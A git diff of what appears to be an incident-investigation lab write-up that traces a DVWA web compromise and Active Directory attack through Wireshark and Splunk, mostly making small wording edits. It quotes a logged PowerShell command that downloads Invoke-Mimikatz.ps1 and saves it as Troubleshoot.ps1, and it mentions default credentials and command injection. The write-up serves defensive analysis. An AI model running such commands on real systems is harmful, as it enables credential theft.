@@ -48,7 +48,7 @@ admin : password
 <img width="2870" height="1398" alt="image" src="https://github.com/user-attachments/assets/fa136340-d15d-4b66-8d24-f70478606530" />
 
 
-This was a clear misconfiguration.
+This was a clear misconfiguration :(
 
 ### ❓ Q2) What is the IP of the attacker machine while interacting with the webserver?
 
@@ -63,7 +63,7 @@ The attacker’s IP address while interacting with the webserver was:
 
 **Answer:** 6  
 
-This was determined by reviewing POST requests sent to the webserver ( POST /dvwa/vulnerabilities/exec/ ). It seemed like the attacker tried to upload some commands in through an upload field in the webserver.
+This was determined by reviewing POST requests sent to the webserver ( POST /dvwa/vulnerabilities/exec/ ). It seemed like the attacker tried to upload some commands through an upload field in the webserver.
 
 <img width="2877" height="1235" alt="image" src="https://github.com/user-attachments/assets/3a49262c-28dc-41d3-a0a5-ca15db97bf02" />
 
@@ -82,7 +82,6 @@ Following the TCP stream showed the sensitive data returned in the webserver res
 
 ### ❓ Q6) What internal network subnet did the attacker discover and scan?
 
-Using the filter:
 Looking at the last POST request in the conversatons(
 ip.dst == 192.168.1.12 && ip.src == 192.168.1.13) we can see the nmap scan to the subnet.
 The scan targeted:
@@ -94,7 +93,7 @@ The scan targeted:
 
 ### ❓ Q7) Using Splunk, what is the domain name of the AD environment?
 
-Starting with a broad search:
+I tend to start with a broad search so that I can have more control on what artefacts to narrow down to.
 index=*
 
 <img width="2849" height="1277" alt="image" src="https://github.com/user-attachments/assets/5769b83f-e066-4cae-9057-c81622cf360c" />
@@ -117,7 +116,7 @@ PowerShell activity was observed on the second system. The first system only sho
 
 ### ❓ Q9) What is the first file downloaded onto the system?  
 **(Format: ActualName, GivenName)**
-I looked into sysmon logs with the computer name and the hostname and found a process creation Sysmon Event ID 1 that showed PowerShell executing:
+I looked into sysmon logs with the computer name and the hostname.Then I found a process creation Sysmon Event ID 1 that showed PowerShell executing:
 
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1 -OutFile Troubleshoot.ps1
 
@@ -132,7 +131,7 @@ Invoke-Mimikatz.ps1, Troubleshoot.ps1
 For that one I used the search query: 
 
 <img width="2852" height="522" alt="image" src="https://github.com/user-attachments/assets/3d92cef4-a542-49eb-ace5-b0639dc0ff5e" />
-
+which is basically only listing the time, commandline and the originalfilename that called the command executed.
 
 Reviewing commands executed from `Troubleshoot.ps1` revealed the credential-dumping command.
 
@@ -172,3 +171,6 @@ The command was identified from the logs, right next to the first ptt attack.
 This investigation demonstrated a full attack chain, from web exploitation to domain-wide compromise, highlighting the importance of proper configuration, monitoring, and incident response.
 
 Thanks for reading.
+If you have any questions or comments feel free to reach out to me through Linkedln
+:)
+
